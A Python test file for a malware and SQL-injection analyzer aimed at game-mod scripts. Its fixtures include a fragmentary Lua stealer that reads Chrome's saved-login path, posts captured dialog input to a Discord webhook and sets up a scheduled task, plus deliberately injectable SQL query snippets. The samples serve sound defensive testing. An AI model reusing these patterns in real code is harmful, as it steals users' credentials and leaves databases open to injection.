"""Fixtures for analyzer heuristics: python -I tests/test_analyzer.py (from the project folder)."""
import io, os, sys, zipfile
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import analyzer

STEALER = r'''
local requests = require("requests")
local path = os.getenv("LOCALAPPDATA") .. "\Google\Chrome\User Data\Default\Login Data"
function sampev.onSendDialogResponse(id, btn, list, input)
  requests.post("https://discord.com/api/webhooks/123/abc", {data = input})
end
os.execute("schtasks /create /tn x /tr evil.exe")
'''
SQLI = '''
local q = "SELECT * FROM users WHERE name = '" .. nick .. "'"
db:exec(string.format("DELETE FROM items WHERE id = %s", id))
'''
PAWN = 'mysql_format(h, q, sizeof q, "SELECT * FROM accs WHERE name = \'%s\'", name);\nmysql_tquery(h, q);'
SAFE_PAWN = 'mysql_format(h, q, sizeof q, "SELECT * FROM accs WHERE name = \'%e\'", name);'
CLEAN = 'script_name("hello")\nfunction main() sampRegisterChatCommand("hi", function() sampAddChatMessage("hi", -1) end) wait(-1) end\n'

def rules(rep):
    return {f["rule"] for x in rep["files"] for f in x["findings"]}

def zip_of(files, pwd=False):
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w") as z:
        for n, d in files.items():
            z.writestr(n, d)
    data = bytearray(b.getvalue())
    if pwd:  # set the "encrypted" flag bit in local and central headers
        for sig in (b"PK\x03\x04", b"PK\x01\x02"):
            i = data.find(sig)
            off = 6 if sig == b"PK\x03\x04" else 8
            data[i + off] |= 1
    return bytes(data)

r = rules(analyzer.analyze("x.zip", zip_of({"mod/stealer.lua": STEALER, "readme.txt": "hi"})))
assert {"exfil.discord_webhook", "steal.browser", "steal.password_dialog", "exec.shell", "persist.autorun", "fs.write_outside"} <= r, r
r = rules(analyzer.analyze("db.lua", SQLI.encode()))
assert {"sqli.lua_concat", "sqli.format_s", "sqli.exec"} <= r, r
assert "sqli.format_s" in rules(analyzer.analyze("gm.pwn", PAWN.encode()))
assert "sqli.format_s" not in rules(analyzer.analyze("gm.pwn", SAFE_PAWN.encode()))
assert "archive.encrypted" in rules(analyzer.analyze("p.zip", zip_of({"a.lua": "x"}, pwd=True)))
assert "lua.bytecode" in rules(analyzer.analyze("a.luac", b"\x1bLJ\x02\x00" + b"\x00" * 64))
assert "file.double_ext" in rules(analyzer.analyze("x.zip", zip_of({"script.lua.exe": "MZ"})))
clean = [f for x in analyzer.analyze("ok.lua", CLEAN.encode())["files"] for f in x["findings"] if f["severity"] != "info"]
assert not clean, clean
print("ok")

# False positives seen on real releases
fp = rules(analyzer.analyze("a.lua", b"local state = {}\nlocal function load() end\nload()\ninicfg.load({}, 'x')\nlocal winhttp = 'WinHttpSetTimeouts'\n"))
assert not fp & {"steal.browser", "exec.download"}, fp
assert {f["line"] for x in analyzer.analyze("a.lua", b"local function load() end\nx = 1\nload()\n")["files"] for f in x["findings"] if f["rule"] == "exec.dynamic_code"} == {3}
assert "exec.dynamic_code" in rules(analyzer.analyze("a.lua", b"loadstring(payload)()"))
print("ok fp")
